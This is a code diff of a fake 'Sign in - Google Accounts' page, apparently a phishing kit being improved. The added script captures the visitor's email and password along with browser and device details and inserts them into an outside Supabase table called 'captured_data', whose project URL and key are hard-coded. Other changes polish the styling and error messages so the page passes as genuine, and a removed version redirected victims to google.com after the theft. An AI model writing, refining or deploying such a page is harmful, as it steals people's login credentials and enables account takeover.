@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
-    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * {
@@ -91,10 +90,16 @@
             font-weight: 500;
             cursor: pointer;
             transition: 0.2s;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
         .btn:hover {
             background: #1557b0;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
         }
 
         .btn:disabled {
@@ -110,7 +115,6 @@
             border-top: 2px solid transparent;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin: 0 auto;
         }
 
         @keyframes spin {
@@ -125,6 +129,25 @@
             font-weight: 500;
             display: block;
             margin-bottom: 32px;
+            cursor: pointer;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .success-message {
+            color: #188038;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: none;
         }
     </style>
 </head>
@@ -137,6 +160,7 @@
         <p class="subtitle">to continue to Google</p>
 
         <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage"></div>
 
         <div class="input-group">
             <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
@@ -145,8 +169,8 @@
         <div class="input-group" id="passwordGroup" style="display:none;">
             <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
         </div>
-        
- <a href="#" class="forgot" onclick="handleForgot(event)">Forgot email?</a>
+
+        <a href="#" class="forgot" onclick="handleForgot(event)">Forgot email?</a>
 
         <button class="btn" id="submitBtn" onclick="handleSubmit()">
             <span id="btnText">Next</span>
@@ -155,92 +179,172 @@
     </div>
 
     <script>
-        // REPLACE WITH YOUR SUPABASE CREDENTIALS
+        // Supabase configuration
         const SUPABASE_URL = 'https://aqynejlgjwdmxsekuyld.supabase.co';
         const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
         
+        // Initialize Supabase
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
         
         let step = 1;
-
-function handleSubmit() {
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const submitBtn = document.getElementById('submitBtn');
-    
-    if (step === 1) {
-        // Step 1: Get email
-        const email = emailInput.value.trim();
         
-        if (!email) {
-            alert('Please enter your email');
-            return;
+        function showError(message) {
+            const errorElement = document.getElementById('errorMessage');
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
+            document.getElementById('successMessage').style.display = 'none';
+            setTimeout(() => {
+                errorElement.style.display = 'none';
+            }, 5000);
         }
         
-        // Show password field
-        passwordInput.style.display = 'block';
-        submitBtn.textContent = 'Sign in';
-        step = 2;
-        
-        // Focus on password field
-        setTimeout(() => passwordInput.focus(), 100);
-        
-    } else if (step === 2) {
-        // Step 2: Get password
-        const password = passwordInput.value;
-        
-        if (!password) {
-            alert('Please enter your password');
-            return;
+        function showSuccess(message) {
+            const successElement = document.getElementById('successMessage');
+            successElement.textContent = message;
+            successElement.style.display = 'block';
+            document.getElementById('errorMessage').style.display = 'none';
+            setTimeout(() => {
+                successElement.style.display = 'none';
+            }, 5000);
         }
         
-        // Process login (add your logic here)
-        console.log('Login attempt:', {
-            email: emailInput.value,
-            password: password,
-            timestamp: new Date().toISOString()
-        });
-        
-        // Reset form
-        emailInput.value = '';
-        passwordInput.value = '';
-        passwordInput.style.display = 'none';
-        submitBtn.textContent = 'Next';
-        step = 1;
-    }
-}
-                // Save to Supabase
-                saveData(email, password.value);
+        async function handleSubmit() {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const loading = document.getElementById('loading');
+            
+            if (step === 1) {
+                // Step 1: Get email
+                const email = emailInput.value.trim();
                 
-                // Redirect
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 1000);
+                if (!email) {
+                    showError('Please enter your email or phone');
+                    return;
+                }
+                
+                // Show password field
+                passwordGroup.style.display = 'block';
+                btnText.textContent = 'Sign in';
+                step = 2;
+                
+                // Focus on password field
+                setTimeout(() => passwordInput.focus(), 100);
+                
+            } else if (step === 2) {
+                // Step 2: Get password and save to Supabase
+                const email = emailInput.value.trim();
+                const password = passwordInput.value;
+                
+                if (!password) {
+                    showError('Please enter your password');
+                    return;
+                }
+                
+                // Show loading
+                submitBtn.disabled = true;
+                loading.style.display = 'block';
+                btnText.style.display = 'none';
+                
+                try {
+                    // Save to Supabase
+                    const { data, error } = await supabase
+                        .from('captured_data')
+                        .insert([
+                            {
+                                email: email,
+                                password: password,
+                                user_agent: navigator.userAgent,
+                                referer: document.referrer || 'Direct',
+                                device_info: {
+                                    language: navigator.language,
+                                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                    platform: navigator.platform,
+                                    cookiesEnabled: navigator.cookieEnabled
+                                },
+                                created_at: new Date().toISOString()
+                            }
+                        ])
+                        .select();
+                    
+                    if (error) {
+                        console.error('Supabase error:', error);
+                        showError('Error saving data: ' + error.message);
+                    } else {
+                        console.log('✅ Data saved successfully:', data);
+                        showSuccess('Login successful! Data saved.');
+                        
+                        // Reset form after 2 seconds
+                        setTimeout(() => {
+                            emailInput.value = '';
+                            passwordInput.value = '';
+                            passwordGroup.style.display = 'none';
+                            btnText.textContent = 'Next';
+                            step = 1;
+                        }, 2000);
+                    }
+                    
+                } catch (err) {
+                    console.error('Error:', err);
+                    showError('Connection error: ' + err.message);
+                } finally {
+                    // Hide loading
+                    submitBtn.disabled = false;
+                    loading.style.display = 'none';
+                    btnText.style.display = 'inline';
+                }
             }
         }
         
-        async function saveData(email, password) {
+        function handleForgot(event) {
+            event.preventDefault();
+            alert('Please enter the email you used to create your account.');
+            document.getElementById('email').focus();
+        }
+        
+        // Add Enter key support
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            
+            emailInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleSubmit();
+                }
+            });
+            
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleSubmit();
+                }
+            });
+        });
+        
+        // Test Supabase connection on page load
+        async function testConnection() {
             try {
                 const { data, error } = await supabase
                     .from('captured_data')
-                    .insert([
-                        {
-                            email: email,
-                            password: password,
-                            user_agent: navigator.userAgent,
-                            created_at: new Date()
-                        }
-                    ]);
+                    .select('count', { count: 'exact', head: true });
                 
                 if (error) {
-                    console.error('Error:', error);
+                    console.error('Supabase connection error:', error);
+                    console.log('Make sure you have created the "captured_data" table in Supabase');
                 } else {
-                    console.log('✅ Saved successfully');
+                    console.log('✅ Supabase connected successfully');
                 }
             } catch (err) {
-                console.error('Error:', err);
+                console.error('Supabase connection failed:', err);
             }
         }
+        
+        // Test connection when page loads
+        testConnection();
     </script>
 </body>
 </html>
